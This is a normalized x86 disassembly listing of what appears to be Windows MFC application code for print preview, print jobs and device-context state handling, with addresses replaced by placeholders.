movzx ecx [ ecx + 0x1e ]
cmp edx ecx
jbe r-xdata
mov eax [ eax ]
mov eax [ eax + 0x5c ]
movzx eax [ eax + 0x1c ]
cmp [ esi + 0xf4 ] eax
jae r-xdata
mov [ esi + 0xf4 ] ecx
xor edi edi
cmp [ esi + 0xec ] edi
jne r-xdata
mov [ esi + 0xf4 ] eax
cmp [ esp + 0x10 ] edi
je r-xdata
push 0x1
mov ecx esi
push [ esi + 0xf4 ]
push 0x1
call sub_43ffc9
push 0x1
push edi
push [ esi + 0x1c ]
call [ InvalidateRect@IAT ]
pop edi
pop esi
retn 0x8
lea eax [ esi + 0xf0 ]
xor ecx ecx
cmp [ eax ] edi
jbe r-xdata
push ebx
xor edx edx
mov ebx [ esi + 0x90 ]
inc ecx
mov [ ebx + edx + 0x18 ] edi
add edx 0x28
cmp ecx [ eax ]
jb r-xdata
pop ebx
sub_45962c
mov eax sub_463c84
call sub_42dc88
sub esp 0x54
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
lea eax [ ebx + edi - 0x1 ]
mov [ ebp + 0xc ] eax
call sub_4428ff
mov eax [ eax + 0x1c ]
mov [ ebp - 0x10 ] eax
xor eax eax
cmp edi 0x1
setne al
mov edi eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ esi + 0x114 ]
and [ ebp - 0x4 ] 0x0
push 0xa
push edi
mov eax [ eax + 0x1c ]
push eax
lea eax [ ebp + 0x8 ]
push eax
call sub_443871
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
test edi edi
jne r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x60 ]
push ebx
push [ ebp + 0x8 ]
push eax
call [ wsprintfA@IAT ]
add esp 0x10
push ebx
lea eax [ ebp - 0x60 ]
push [ ebp + 0x8 ]
push eax
call [ wsprintfA@IAT ]
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0x10 ]
push 0x0
push 0x362
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
sub_4596e5
mov eax sub_463c98
call sub_42dc88
push ecx
mov eax [ rw-data ]
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0xec ] 0x0
jne r-xdata
mov eax [ esi + 0xe8 ]
mov eax [ esi + 0xf8 ]
jmp r-xdata
xor eax eax
push 0x1
pop eax
cmp [ esi + 0xf0 ] eax
je r-xdata
dec eax
lea ecx [ ebp - 0x10 ]
neg eax
sbb eax eax
add eax 0xf042
push eax
call sub_4437c6
mov edi [ ebp + 0x8 ]
push [ ebp - 0x10 ]
mov ecx edi
mov eax [ edi ]
call [ eax + 0xc ]
cmp [ esi + 0xec ] 0x0
jne r-xdata
mov ecx [ esi + 0x114 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0x5c ]
cmp [ ecx + 0x1e ] ax
ja r-xdata
mov edx [ edi ]
push eax
mov ecx edi
call [ edx ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ esi + 0xf8 ] eax
ja r-xdata
sub_459789
mov eax ecx
push esi
push edi
mov ecx [ esp + 0xc ]
mov esi [ eax + 0xf8 ]
mov edi [ eax + 0xf4 ]
mov eax [ eax + 0x114 ]
mov edx [ ecx ]
lea esi [ esi + edi - 0x1 ]
mov eax [ eax ]
mov eax [ eax + 0x5c ]
movzx eax [ eax + 0x1e ]
cmp esi eax
sbb eax eax
neg eax
push eax
call [ edx ]
pop edi
pop esi
retn 0x4
sub_4597c0
mov eax ecx
push esi
mov ecx [ esp + 0x8 ]
mov esi [ eax + 0x114 ]
mov edx [ ecx ]
mov esi [ esi ]
mov esi [ esi + 0x5c ]
movzx esi [ esi + 0x1c ]
cmp esi [ eax + 0xf4 ]
sbb eax eax
neg eax
push eax
call [ edx ]
pop esi
retn 0x4
sub_459820
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0xc ] 0x1
push esi
mov esi ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call [ GetCursorPos@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x1c ]
call [ ScreenToClient@IAT ]
cmp [ esi + 0xec ] 0x2
je r-xdata
call sub_43e71a
jmp r-xdata
push 0x7f00
push 0x0
call [ LoadCursorA@IAT ]
push eax
lea eax [ ebp + 0xc ]
mov ecx esi
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_4592c8
test eax eax
je r-xdata
pop esi
leave
retn 0xc
add esi 0x100
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
jmp r-xdata
call sub_45357b
mov eax [ eax + 0xc ]
push 0x7902
push eax
call [ LoadCursorA@IAT ]
mov [ esi ] eax
call [ SetCursor@IAT ]
xor eax eax
sub_4598a8
sub esp 0x1c
mov ecx rw-data
push esi
push edi
push sub_453033
call sub_455223
mov esi eax
xor edi edi
xor eax eax
cmp [ esi + 0xc ] edi
sete al
push edi
push edi
push edi
lea eax [ esp + 0x14 ]
push edi
push eax
call [ PeekMessageA@IAT ]
test eax eax
je r-xdata
call sub_4428ff
mov edx [ eax ]
mov ecx eax
call [ edx + 0x5c ]
test eax eax
jne r-xdata
cmp [ esi + 0xc ] edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
add esp 0x1c
retn 0x8
sub_4598fa
push esi
mov esi ecx
call sub_45357b
push [ eax + 0x10 ]
mov ecx esi
call sub_4416d5
push 0x0
mov ecx esi
call sub_440bd0
mov ecx esi
call sub_43e113
pop esi
retn
sub_459940
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov eax [ esi ]
mov eax [ eax + 0x5c ]
mov cx [ eax + 0x1c ]
cmp cx [ eax + 0x1e ]
jbe r-xdata
call sub_45357b
mov edi [ eax + 0x4 ]
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov [ eax + 0x1e ] cx
mov eax [ esi ]
mov eax [ eax + 0x5c ]
cmp [ eax + 0x10 ] ebx
jne r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x5c ]
mov cx [ eax + 0x1c ]
mov [ eax + 0x18 ] cx
mov eax [ esi ]
mov eax [ eax + 0x5c ]
mov cx [ eax + 0x1e ]
mov [ eax + 0x1a ] cx
push eax
mov ecx edi
call sub_457f8e
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] ebx
je r-xdata
mov eax [ edi + 0xb4 ]
push 0xf044
lea ecx [ esi + 0x1c ]
mov [ esi + 0x18 ] eax
call sub_4437c6
push 0x1
pop eax
xor eax eax
jmp r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x5c ]
cmp [ eax + 0x10 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x5c ]
mov cx [ eax + 0x1c ]
mov [ eax + 0x18 ] cx
mov eax [ esi ]
mov eax [ eax + 0x5c ]
mov cx [ eax + 0x1e ]
mov [ eax + 0x1a ] cx
push [ esi ]
mov ecx edi
call sub_4581eb
cmp eax 0x1
je r-xdata
test [ esi + 0x38 ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
retn 0x4
call sub_43b988
test eax eax
je r-xdata
push [ esi ]
mov ecx edi
call sub_4581eb
cmp eax 0x1
jne r-xdata
test [ esi + 0x38 ] 0x1
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x5c ]
cmp [ eax + 0x10 ] ebx
jne r-xdata
jmp r-xdata
sub_459a2c
mov eax sub_463d74
call sub_42dc88
sub esp 0x32c
push ebx
push esi
push edi
mov edi ecx
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x24 ] edi
call sub_45a14d
xor ebx ebx
mov [ ebp - 0x4 ] ebx
call sub_43e6e5
cmp [ eax + 0x8 ] 0xe108
jne r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x80 ]
push ecx
mov ecx edi
call [ eax + 0xf4 ]
test eax eax
je r-xdata
call sub_45357b
mov eax [ eax + 0x4 ]
mov eax [ eax + 0xac ]
cmp eax ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x80 ]
call sub_45a1d5
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ rw-data ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ eax + 0x5c ]
test [ eax + 0x14 ] 0x20
je r-xdata
mov [ ebp - 0x74 ] 0x1
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ edi + 0x3c ]
mov [ ebp - 0x4 ] 0xa
cmp eax ebx
je r-xdata
cmp [ ebp - 0x7c ] ebx
jne r-xdata
mov ecx [ eax + 0x20 ]
mov edx [ eax + 0x18 ]
mov eax [ eax + 0x1c ]
push ebx
push ecx
push edx
push eax
call [ CreateDCA@IAT ]
mov ecx [ ebp - 0x80 ]
mov ecx [ ecx + 0x5c ]
mov [ ecx + 0x10 ] eax
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x5c ]
cmp [ eax + 0x10 ] ebx
jne r-xdata
lea eax [ ebp - 0x14 ]
mov ecx edi
push eax
call sub_43fcfb
mov ecx eax
call sub_43f17d
add eax 0x1c
lea ecx [ ebp - 0x14 ]
push eax
call sub_442281
jmp r-xdata
push 0xf045
lea ecx [ ebp - 0x1c ]
call sub_4421b6
push 0xf046
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x2
call sub_4421b6
push 0xf047
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x3
call sub_4421b6
push 0xf048
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x4
call sub_4421b6
push ebx
lea ecx [ ebp - 0x338 ]
push [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x5
push 0x6
push [ ebp - 0x40 ]
push [ ebp - 0x1c ]
push ebx
call sub_43bad7
mov eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x338 ]
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x2ac ] eax
call sub_43bc39
cmp eax 0x1
je r-xdata
push 0xffffffff
push ebx
push 0xf106
call sub_4496ef
jmp r-xdata
push 0x14
lea eax [ ebp - 0x94 ]
pop esi
push esi
push ebx
push eax
call sub_42dc30
mov eax [ ebp - 0x14 ]
add esp 0xc
mov [ ebp - 0x90 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x94 ] esi
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0xb
cmp [ eax - 0x8 ] ebx
jne r-xdata
push 0x1f
lea ecx [ ebp - 0x14 ]
call sub_4425c7
mov eax [ ebp - 0x14 ]
mov eax [ eax - 0x8 ]
cmp eax 0x1f
jle r-xdata
lea eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x338 ]
push eax
call sub_43bd14
push eax
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x8
call sub_442281
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x6
call sub_442148
lea ecx [ ebp - 0x28c ]
mov [ ebp - 0x4 ] 0x9
call sub_442148
lea ecx [ ebp - 0x338 ]
mov [ ebp - 0x4 ] 0x5
call sub_43da87
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x4
call sub_442148
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x3
call sub_442148
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x2
call sub_442148
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
lea ecx [ ebp - 0x28c ]
mov [ ebp - 0x4 ] 0x7
call sub_442148
lea ecx [ ebp - 0x338 ]
mov [ ebp - 0x4 ] 0x5
call sub_43da87
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x4
call sub_442148
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x3
call sub_442148
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x2
call sub_442148
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1c ]
jmp r-xdata
mov [ ebp - 0x8c ] eax
mov esi eax
mov eax 0x104
lea ecx [ ebp - 0x38 ]
push eax
push eax
call sub_442578
push eax
push esi
call sub_444a11
mov esi 0xf049
mov ecx [ ebp - 0x80 ]
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x8c ] ebx
call sub_43ba22
push eax
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0xc
call sub_442281
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xb
call sub_442148
mov esi 0xf040
jmp r-xdata
call sub_442148
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x4 ] bl
call sub_442148
mov eax [ edi ]
lea ecx [ ebp - 0x80 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0xf8 ]
cmp [ ebp - 0x7c ] ebx
jne r-xdata
mov eax [ ebp - 0x80 ]
lea ecx [ ebp - 0x34 ]
mov eax [ eax + 0x5c ]
push [ eax + 0x10 ]
call sub_446c1f
mov [ ebp - 0x28 ] 0x1
lea ecx [ ebp - 0x34 ]
call sub_446b68
cmp [ ebp - 0x7c ] ebx
mov [ ebp - 0x4 ] 0xd
jne r-xdata
push ebx
call sub_420710
mov ecx eax
call sub_441841
push edi
lea ecx [ ebp - 0xf0 ]
call sub_45a09b
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
push [ ebp - 0x14 ]
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0xf
push 0xc9
call sub_4415dd
mov ecx [ ebp - 0x80 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_43b9e4
push [ eax ]
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0x10
push 0xca
call sub_4415dd
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xf
call sub_442148
push [ ebp - 0x38 ]
lea eax [ ebp - 0x20 ]
push esi
push eax
call sub_44af4d
push [ ebp - 0x20 ]
lea ecx [ ebp - 0xf0 ]
push 0xcb
call sub_4415dd
push 0x5
lea ecx [ ebp - 0xf0 ]
call sub_4417ff
push [ ebp - 0xd4 ]
call [ UpdateWindow@IAT ]
cmp [ ebp - 0x7c ] ebx
jne r-xdata
push sub_4598a8
push [ ebp - 0x30 ]
call [ SetAbortProc@IAT ]
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x5c ]
movzx edx [ eax + 0x1a ]
movzx ecx [ eax + 0x1c ]
movzx esi [ eax + 0x18 ]
cmp edx ecx
mov [ ebp - 0x10 ] edx
jae r-xdata
lea eax [ ebp - 0x94 ]
push eax
push [ ebp - 0x30 ]
call [ StartDocA@IAT ]
cmp eax 0xffffffff
jne r-xdata
movzx eax [ eax + 0x1e ]
cmp [ ebp - 0x10 ] eax
jbe r-xdata
mov [ ebp - 0x10 ] ecx
push 0x1
call sub_420710
mov ecx eax
call sub_441841
mov eax [ edi ]
lea ecx [ ebp - 0x80 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0x100 ]
lea ecx [ ebp - 0xf0 ]
call sub_43effe
lea ecx [ ebp - 0x34 ]
call sub_446c56
push 0xffffffff
push ebx
push 0xf106
call sub_4496ef
jmp r-xdata
cmp esi ecx
jae r-xdata
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0xe
call sub_442148
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0xd
mov [ ebp - 0xf0 ] r--data
call sub_43da87
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0xb
call sub_446c9d
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0xa
call sub_442148
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x14 ]
cmp esi eax
jbe r-xdata
mov esi ecx
cmp [ ebp - 0x10 ] esi
mov ecx 0xffff
sbb eax eax
and al 0xfe
inc eax
cmp [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] eax
jne r-xdata
mov esi eax
add [ ebp - 0x10 ] eax
mov [ ebp - 0x10 ] ecx
jmp r-xdata
cmp esi [ ebp - 0x10 ]
mov [ ebp - 0x6c ] esi
je r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x80 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0xdc ]
mov eax [ edi ]
lea ecx [ ebp - 0x80 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0xfc ]
jmp r-xdata
push 0xf043
lea ecx [ ebp - 0x20 ]
call sub_4437c6
cmp [ ebp - 0x7c ] ebx
mov [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x30 ]
call [ EndDoc@IAT ]
jmp r-xdata
mov esi [ GetDeviceCaps@IAT ]
cmp [ ebp - 0x7c ] ebx
jne r-xdata
push 0x1
call sub_420710
mov ecx eax
call sub_441841
mov eax [ edi ]
lea ecx [ ebp - 0x80 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0x100 ]
lea ecx [ ebp - 0xf0 ]
call sub_43effe
lea ecx [ ebp - 0x34 ]
call sub_446c56
push [ ebp - 0x6c ]
lea eax [ ebp - 0x140 ]
push [ ebp - 0x20 ]
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x140 ]
lea ecx [ ebp - 0xf0 ]
push eax
push 0xcc
call sub_4415dd
push 0xa
push [ ebp - 0x2c ]
call esi
push 0x8
mov edi eax
push [ ebp - 0x2c ]
call esi
push edi
push eax
push ebx
lea eax [ ebp - 0x5c ]
push ebx
push eax
call [ SetRect@IAT ]
lea eax [ ebp - 0x5c ]
push 0x2
push eax
push [ ebp - 0x2c ]
call [ DPtoLP@IAT ]
push [ ebp - 0x30 ]
call [ StartPage@IAT ]
cmp eax ebx
jl r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
mov edi [ ebp - 0x24 ]
mov [ ebp - 0x1c ] 0x1
cmp [ rw-data ] ebx
mov edi [ ebp - 0x24 ]
je r-xdata
push [ ebp - 0x30 ]
call [ AbortDoc@IAT ]
mov eax [ edi ]
lea ecx [ ebp - 0x80 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0xfc ]
push [ ebp - 0x30 ]
call [ EndPage@IAT ]
cmp eax ebx
jl r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x80 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0xdc ]
push ebx
push [ ebp - 0x30 ]
call sub_4598a8
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov edi [ ebp - 0x24 ]
add [ ebp - 0x6c ] eax
mov eax [ ebp - 0x6c ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x80 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0xdc ]
cmp [ ebp - 0x70 ] ebx
je r-xdata
jmp r-xdata
sub_45a09b
mov eax sub_463d88
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_43da49
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
mov [ esi ] r--data
push 0x7802
call sub_43dac5
push sub_453033
mov ecx rw-data
call sub_455223
and [ eax + 0xc ] 0x0
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_45a115
mov eax sub_463d9c
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xac ]
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_43da87
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_45a14d
mov eax sub_463dbc
call sub_42dc88
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi + 0x1c ] eax
xor edi edi
push 0xa4
mov [ ebp - 0x4 ] edi
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
push 0x1
cmp ecx edi
pop ebx
mov [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
push edi
push 0x40004
push edi
call sub_43b7ed
jmp r-xdata
mov [ esi ] eax
mov eax [ eax + 0x5c ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x1c ] bx
mov eax [ esi ]
mov eax [ eax + 0x5c ]
or [ eax + 0x1e ] 0xffff
mov [ esi + 0x20 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] ebx
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
sub_45a1d5
mov eax sub_463dd3
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x1c ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
push eax
call [ DeleteDC@IAT ]
mov eax [ esi ]
mov eax [ eax + 0x5c ]
and [ eax + 0x10 ] 0x0
sub_45a230
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
imul [ ebp + 0x10 ]
push esi
push edi
mov edi eax
mov eax [ ebp + 0x14 ]
mov ecx edx
imul [ ebp + 0x18 ]
test ecx ecx
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi edx
jg r-xdata
mov eax edi
mov edx ecx
jl r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jge r-xdata
push 0x1
pop ecx
call sub_4302f0
inc edi
jmp r-xdata
mov eax edi
mov edx ecx
neg eax
adc edx 0x0
neg edx
jmp r-xdata
test edi edi
jae r-xdata
and [ ebp + 0xc ] 0x0
cdq
neg eax
mov ecx eax
or ecx edx
je r-xdata
xor edi edi
add edi [ ebp + 0xc ]
test esi esi
jg r-xdata
push 0x1
pop ecx
call sub_4302f0
inc [ ebp + 0xc ]
jmp r-xdata
mov eax edi
dec edi
cmp eax 0x1f
jle r-xdata
jl r-xdata
mov ecx eax
or ecx edx
je r-xdata
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
cdq
push [ ebp - 0x8 ]
push edx
push eax
call sub_4302b0
mov ecx ebx
mov [ ebp - 0x8 ] eax
or ecx esi
mov edi edx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
push 0x1
pop ecx
call sub_4302f0
push 0x1
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
pop ecx
mov eax ebx
mov edx esi
call sub_4302f0
mov ebx eax
mov eax edi
dec edi
cmp eax 0x1f
mov esi edx
jle r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
neg ebx
adc esi 0x0
neg esi
neg eax
adc ecx 0x0
mov [ ebp - 0x8 ] eax
neg ecx
mov [ ebp - 0x4 ] ecx
test ebx ebx
jae r-xdata
push 0x0
push 0x2
push esi
push ebx
call sub_430200
add eax [ ebp - 0x8 ]
push esi
push ebx
adc edx edi
push edx
push eax
call sub_430200
test edi edi
jg r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
push 0x1
pop ecx
call sub_4302f0
push 0x1
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
pop ecx
mov eax ebx
mov edx esi
call sub_4302f0
mov ebx eax
mov eax edi
dec edi
cmp eax 0x1f
mov esi edx
jle r-xdata
mov eax 0x7fffffff
jmp r-xdata
jl r-xdata
sar [ ebp + 0x8 ] 0x1
push 0x1
mov eax ebx
pop ecx
call sub_4302f0
mov ebx eax
mov esi edx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
mov eax 0x80000000
jmp r-xdata
test eax eax
jae r-xdata
sub_45a38f
push esi
mov esi ecx
call sub_446b68
push 0x1
and [ esi + 0x2c ] 0x0
and [ esi + 0x28 ] 0x0
pop eax
push 0x8
mov [ esi + 0x14 ] eax
mov [ esi + 0x10 ] eax
pop eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x20 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_45a3d7
push esi
mov esi ecx
push [ esp + 0x8 ]
call [ SaveDC@IAT ]
push [ esp + 0x8 ]
mov ecx esi
mov [ esi + 0x18 ] eax
call sub_446cdd
cmp [ esi + 0x8 ] 0x0
je r-xdata
pop esi
retn 0x4
push 0x0
mov ecx esi
call sub_45b00a
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov ecx esi
call sub_45a6a8
push eax
push [ esi + 0x4 ]
call [ SelectObject@IAT ]
jmp r-xdata
mov ecx esi
call sub_45a55e
sub_45a43e
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_446cd3
push 0x1
mov ecx esi
call sub_45b00a
mov ecx esi
call sub_45a6a8
mov ecx esi
call sub_45a55e
pop esi
retn 0x4
sub_45a465
mov eax sub_464a2c
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x28 ]
push eax
call sub_4479eb
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_446c9d
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_45a4a1
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
mov [ esi + 0x10 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x14 ] eax
je r-xdata
pop esi
retn 0x8
push 0x1
call sub_45b00a
mov ecx esi
call sub_45a6a8
sub_45a4ca
push ebx
mov ebx [ SaveDC@IAT ]
push ebp
push esi
mov esi ecx
push [ esi + 0x8 ]
call ebx
cmp [ esi + 0x4 ] 0x0
mov ebp eax
je r-xdata
mov [ esi + 0x1c ] 0x7fff
push edi
push 0xd
call [ GetStockObject@IAT ]
mov edi [ SelectObject@IAT ]
push eax
push [ esi + 0x4 ]
call edi
push [ esi + 0x4 ]
call ebx
push [ esi + 0x28 ]
sub eax ebp
mov [ esi + 0x1c ] eax
push [ esi + 0x4 ]
call edi
pop edi
jmp r-xdata
mov eax ebp
pop esi
pop ebp
pop ebx
retn
sub_45a519
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
mov edi [ RestoreDC@IAT ]
mov esi ecx
push ebp
push [ esi + 0x8 ]
call edi
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn 0x4
mov eax [ esi + 0x1c ]
cmp eax 0x7fff
je r-xdata
cmp ebp 0xffffffff
je r-xdata
push ebp
push [ esi + 0x4 ]
call edi
mov ecx esi
mov ebx eax
call sub_45a6a8
add ebp eax
sub_45a55e
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
je r-xdata
pop esi
retn
push ebx
mov ebx [ GetStockObject@IAT ]
push ebp
push edi
push 0x7
call ebx
mov edi [ SelectObject@IAT ]
push eax
push [ esi + 0x8 ]
call edi
mov ebp eax
push ebp
push [ esi + 0x8 ]
call edi
push ebp
push [ esi + 0x4 ]
call edi
push 0x4
call ebx
push eax
push [ esi + 0x8 ]
call edi
mov ebx eax
push ebx
push [ esi + 0x8 ]
call edi
push ebx
push [ esi + 0x4 ]
call edi
push [ esi + 0x8 ]
call [ GetROP2@IAT ]
push eax
mov ecx esi
call sub_446e84
push [ esi + 0x8 ]
call [ GetBkMode@IAT ]
push eax
mov ecx esi
call sub_446e28
push [ esi + 0x8 ]
call [ GetTextAlign@IAT ]
push eax
mov ecx esi
call sub_4472be
push [ esi + 0x8 ]
call [ GetPolyFillMode@IAT ]
push eax
mov ecx esi
call sub_446e56
push [ esi + 0x8 ]
call [ GetStretchBltMode@IAT ]
push eax
mov ecx esi
call sub_446eb2
push [ esi + 0x8 ]
call [ GetTextColor@IAT ]
mov edi [ GetNearestColor@IAT ]
push eax
push [ esi + 0x8 ]
call edi
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x30 ]
push [ esi + 0x8 ]
call [ GetBkColor@IAT ]
push eax
push [ esi + 0x8 ]
call edi
mov edx [ esi ]
push eax
mov ecx esi
